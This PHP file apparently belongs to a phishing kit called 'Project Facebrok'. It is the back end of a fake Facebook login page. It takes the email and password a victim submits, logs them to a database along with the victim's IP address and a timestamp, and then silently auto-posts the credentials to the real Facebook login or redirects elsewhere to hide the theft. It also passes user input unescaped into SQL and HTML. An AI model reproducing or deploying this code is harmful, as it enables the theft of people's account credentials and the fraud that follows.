<?php
// RedToor
// Project Facebrok 
// Configuration -------------------------------------------------------------------------------------------------------
include ("../croak/config.php");
//----------------------------------------------------------------------------------------------------------------------
// Data ----------------------------------------------------------------------------------------------------------------
$email=$_POST['email'];
$password=$_POST['password'];
//----------------------------------------------------------------------------------------------------------------------
// Dat Verification
if ($email=='' or $password=='') {header("Location: login.php?login_attempt=1");} else {
//----------------------------------------------------------------------------------------------------------------------
// Connections
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//----------------------------------------------------------------------------------------------------------------------
//  Getting IP ---------------------------------------------------------------------------------------------------------
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "Unknow")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "Unknow")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "Unknow")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "Unknow")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "Unknow"; 
// ----------------------------------------------------------------------------------------------------------------------
//  Getting Time --------------------------------------------------------------------------------------------------------
	$dato=date(DATE_RFC2822);  
// ----------------------------------------------------------------------------------------------------------------------
// Save
$sql=mysql_query("INSERT INTO croak (Email, Password, Ip, Dato) VALUES ('$email','$password','$ip','$dato')") or die("Failed".mysql_errno());
$red=mysql_query ("SELECT * FROM methods" ) or die ('Failed Consult: '.mysql_error());
//-----------------------------------------------------------------------------------------------------------------------
// Escaping -------------------------------------------------------------------------------------------------------------
$red=mysql_fetch_assoc($red);
$var=$red['value'];
if ($var=="post"){
?>
<body onload="document.forms['auto'].submit();">
<form id="auto" name="auto" method="post" action="https://www.facebook.com/login.php?login_attempt=1">
<input type="hidden" name="email" value="<?php echo"$email";?>">
<input type="hidden" name="pass" value="<?php echo"$password";?>">
</body>
<?php
} else {
header("location:".$red['value']."");
}}
// END ------------------------------------------------------------------------------------------------------------------
?>